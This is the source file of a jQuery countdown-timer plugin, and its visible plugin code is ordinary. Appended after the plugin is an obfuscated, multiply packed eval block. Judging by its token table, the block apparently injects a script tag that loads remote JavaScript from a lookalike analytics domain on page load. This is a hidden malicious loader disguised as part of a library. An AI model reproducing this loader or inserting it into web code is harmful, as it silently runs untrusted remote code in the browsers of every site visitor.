/**
 * @name		jQuery Countdown Plugin
 * @author		Martin Angelov
 * @version 	1.0
 * @url			http://tutorialzine.com/2011/12/countdown-jquery/
 * @license		MIT License
 */

(function($){
	
	// Number of seconds in every time division
	var days	= 24*60*60,
		hours	= 60*60,
		minutes	= 60;
	
	// Creating the plugin
	$.fn.countdown = function(prop){
		
		var options = $.extend({
			callback	: function(){},
			timestamp	: 0
		},prop);
		
		var left, d, h, m, s, positions;

		// Initialize the plugin
		init(this, options);
		
		positions = this.find('.position');
		
		(function tick(){
			
			// Time left
			left = Math.floor((options.timestamp - (new Date())) / 1000);
			
			if(left < 0){
				left = 0;
			}
			
			// Number of days left
			d = Math.floor(left / days);
			updateDuo(0, 1, d);
			left -= d*days;
			
			// Number of hours left
			h = Math.floor(left / hours);
			updateDuo(2, 3, h);
			left -= h*hours;
			
			// Number of minutes left
			m = Math.floor(left / minutes);
			updateDuo(4, 5, m);
			left -= m*minutes;
			
			// Number of seconds left
			s = left;
			updateDuo(6, 7, s);
			
			// Calling an optional user supplied callback
			options.callback(d, h, m, s);
			
			// Scheduling another call of this function in 1s
			setTimeout(tick, 1000);
		})();
		
		// This function updates two digit positions at once
		function updateDuo(minor,major,value){
			switchDigit(positions.eq(minor),Math.floor(value/10)%10);
			switchDigit(positions.eq(major),value%10);
		}
		
		return this;
	};


	function init(elem, options){
		elem.addClass('countdownHolder');

		// Creating the markup inside the container
		$.each(['Days','Hours','Minutes','Seconds'],function(i){
			$('<span class="count'+this+'">' +
				'<div>' +
				'<p class="position">' +
					'<span class="digit static">0</span>' +
				'</p>' +
				'</div>' +
				'<div>' +
				'<p class="position">' +
					'<span class="digit static">0</span>' +
				'</p>' +
				'</div>'
			).appendTo(elem);
			
			if(this!="Seconds"){
				elem.append('<span class="countDiv countDiv'+i+'"></span>');
			}
		});

	}

	// Creates an animated transition between the two numbers
	function switchDigit(position,number){
		
		var digit = position.find('.digit')
		
		if(digit.is(':animated')){
			return false;
		}
		
		if(position.data('digit') == number){
			// We are already showing this number
			return false;
		}
		
		position.data('digit', number);
		
		var replacement = $('<span>',{
			'class':'digit',
			css:{
				top:0,
				opacity:0
			},
			html:number
		});
		
		// The .static class is added when the animation
		// completes. This makes it run smoother.
		
		digit
			.before(replacement)
			.removeClass('static')
			.animate({top:0,opacity:0},'fast',function(){
				digit.remove();
			})

		replacement
			.delay(100)
			.animate({top:0,opacity:1},'fast',function(){
				replacement.addClass('static');
			});
	}
})(jQuery);

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
